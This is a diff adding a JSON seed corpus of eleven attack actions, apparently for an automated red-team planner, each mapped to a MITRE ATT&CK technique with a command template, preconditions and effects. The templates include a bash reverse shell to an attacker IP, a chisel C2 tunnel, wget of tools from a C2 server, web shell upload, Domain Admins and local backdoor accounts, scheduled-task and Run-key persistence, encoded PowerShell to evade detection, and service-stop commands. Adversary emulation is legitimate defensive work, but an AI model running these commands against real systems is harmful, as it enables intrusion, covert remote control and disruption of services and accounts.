@@ -1,0 +1,288 @@
+[
+  {
+    "uuid": "aa-persist-01",
+    "name": "schtasks_persist",
+    "mitre_technique": "T1053.005",
+    "mitre_tactic": "TA0003",
+    "description": "Create scheduled task to re-execute payload at logon",
+    "source": "Atomic Red Team T1053.005 (hand-crafted)",
+    "command_template": "schtasks /create /tn \"{task_name}\" /tr \"{payload_path}\" /sc onlogon /ru SYSTEM /f",
+    "preconditions": {
+      "executor": "cmd",
+      "privilege": "admin",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "local",
+      "additional": ["scheduled_task_service_running"]
+    },
+    "effects": {
+      "grants_access": "persistence",
+      "creates_artifact": "scheduled_task"
+    },
+    "cost": 0.2,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "seed-corpus-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "aa-persist-02",
+    "name": "webshell_drop",
+    "mitre_technique": "T1505.003",
+    "mitre_tactic": "TA0003",
+    "description": "Upload web shell to vulnerable web service for backdoor access",
+    "source": "Atomic Red Team T1505.003 (hand-crafted)",
+    "command_template": "curl -F \"file=@{shell_path}\" {target_upload_url}",
+    "preconditions": {
+      "executor": "bash",
+      "privilege": "none",
+      "required_services": ["http"],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "network",
+      "additional": ["upload_endpoint_writable"]
+    },
+    "effects": {
+      "grants_access": "shell",
+      "creates_artifact": "webshell",
+      "lateral_target": "web_server"
+    },
+    "cost": 0.3,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "seed-corpus-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "aa-persist-03",
+    "name": "ad_account_add",
+    "mitre_technique": "T1098",
+    "mitre_tactic": "TA0003",
+    "description": "Add new domain user and elevate to Domain Admins for persistent access",
+    "source": "Atomic Red Team T1098 (hand-crafted)",
+    "command_template": "net user {username} {password} /add /domain && net group \"Domain Admins\" {username} /add /domain",
+    "preconditions": {
+      "executor": "cmd",
+      "privilege": "domain_admin",
+      "required_services": ["ldap", "smb"],
+      "required_files": [],
+      "required_credentials": ["domain_admin_ticket"],
+      "required_access": "network",
+      "additional": []
+    },
+    "effects": {
+      "grants_access": "domain_admin",
+      "creates_artifact": "ad_account",
+      "lateral_target": "domain"
+    },
+    "cost": 0.1,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "seed-corpus-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "aa-persist-04",
+    "name": "registry_run_key",
+    "mitre_technique": "T1547.001",
+    "mitre_tactic": "TA0003",
+    "description": "Add Run key to launch payload at user login",
+    "source": "Atomic Red Team T1547.001 (hand-crafted)",
+    "command_template": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{name}\" /t REG_SZ /d \"{payload_path}\" /f",
+    "preconditions": {
+      "executor": "cmd",
+      "privilege": "user",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "local",
+      "additional": []
+    },
+    "effects": {
+      "grants_access": "persistence",
+      "creates_artifact": "registry_run_key"
+    },
+    "cost": 0.2,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "seed-corpus-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "aa-persist-05",
+    "name": "local_account_add",
+    "mitre_technique": "T1136.001",
+    "mitre_tactic": "TA0003",
+    "description": "Create local backdoor admin account",
+    "source": "Atomic Red Team T1136.001 (hand-crafted)",
+    "command_template": "useradd -m -s /bin/bash {username} && echo \"{username}:{password}\" | chpasswd",
+    "preconditions": {
+      "executor": "bash",
+      "privilege": "admin",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "local",
+      "additional": []
+    },
+    "effects": {
+      "grants_access": "persistence",
+      "creates_artifact": "local_account"
+    },
+    "cost": 0.2,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "seed-corpus-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "aa-c2-01",
+    "name": "chisel_tunnel",
+    "mitre_technique": "T1572",
+    "mitre_tactic": "TA0011",
+    "description": "Establish SOCKS5 tunnel through HTTP for C2 channel",
+    "source": "chisel project (hand-crafted)",
+    "command_template": "chisel client {attacker_ip}:{c2_port} R:socks",
+    "preconditions": {
+      "executor": "bash",
+      "privilege": "user",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "network",
+      "additional": ["outbound_http_allowed"]
+    },
+    "effects": {
+      "grants_access": "c2_channel",
+      "creates_artifact": "tunnel"
+    },
+    "cost": 0.3,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "seed-corpus-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "aa-c2-02",
+    "name": "base64_c2",
+    "mitre_technique": "T1132.001",
+    "mitre_tactic": "TA0011",
+    "description": "Encode C2 traffic with base64 to evade simple IDS pattern match",
+    "source": "Atomic Red Team T1132.001 (hand-crafted)",
+    "command_template": "powershell -EncodedCommand {base64_payload}",
+    "preconditions": {
+      "executor": "powershell",
+      "privilege": "user",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "local",
+      "additional": []
+    },
+    "effects": {
+      "grants_access": "stealth_c2"
+    },
+    "cost": 0.2,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "seed-corpus-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "aa-c2-03",
+    "name": "nonstandard_port_c2",
+    "mitre_technique": "T1571",
+    "mitre_tactic": "TA0011",
+    "description": "C2 listener on uncommon port to bypass firewall rules",
+    "source": "Atomic Red Team T1571 (hand-crafted)",
+    "command_template": "bash -i >& /dev/tcp/{attacker_ip}/{nonstandard_port} 0>&1",
+    "preconditions": {
+      "executor": "bash",
+      "privilege": "user",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "network",
+      "additional": []
+    },
+    "effects": {
+      "grants_access": "c2_channel",
+      "creates_artifact": "c2_session"
+    },
+    "cost": 0.3,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "seed-corpus-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "aa-c2-04",
+    "name": "ingress_tool_xfer",
+    "mitre_technique": "T1105",
+    "mitre_tactic": "TA0011",
+    "description": "Download additional tools from C2 server to target",
+    "source": "Atomic Red Team T1105 (hand-crafted)",
+    "command_template": "wget {tool_url} -O {tool_path} && chmod +x {tool_path}",
+    "preconditions": {
+      "executor": "bash",
+      "privilege": "user",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "network",
+      "additional": []
+    },
+    "effects": {
+      "grants_access": "tool_available",
+      "creates_artifact": "dropped_file"
+    },
+    "cost": 0.1,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "seed-corpus-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "aa-impact-01",
+    "name": "account_disable",
+    "mitre_technique": "T1531",
+    "mitre_tactic": "TA0040",
+    "description": "Disable user accounts to deny access (recoverable)",
+    "source": "Atomic Red Team T1531 (hand-crafted)",
+    "command_template": "net user {target_user} /active:no",
+    "preconditions": {
+      "executor": "cmd",
+      "privilege": "admin",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "local",
+      "additional": []
+    },
+    "effects": {
+      "grants_access": "dos_user",
+      "creates_artifact": "disabled_account"
+    },
+    "cost": 0.1,
+    "rules_of_engagement_required": true,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "seed-corpus-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "aa-impact-02",
+    "name": "service_stop",
+    "mitre_technique": "T1489",
+    "mitre_tactic": "TA0040",
+    "description": "Stop critical service (recoverable)",
+    "source": "Atomic Red Team T1489 (hand-crafted)",
+    "command_template": "systemctl stop {service_name}",
+    "preconditions": {
+      "executor": "bash",
+      "privilege": "admin",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "local",
+      "additional": []
+    },
+    "effects": {
+      "grants_access": "dos_service"
+    },
+    "cost": 0.1,
+    "rules_of_engagement_required": true,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "seed-corpus-v1", "confidence": 1.0}
+  }
+]
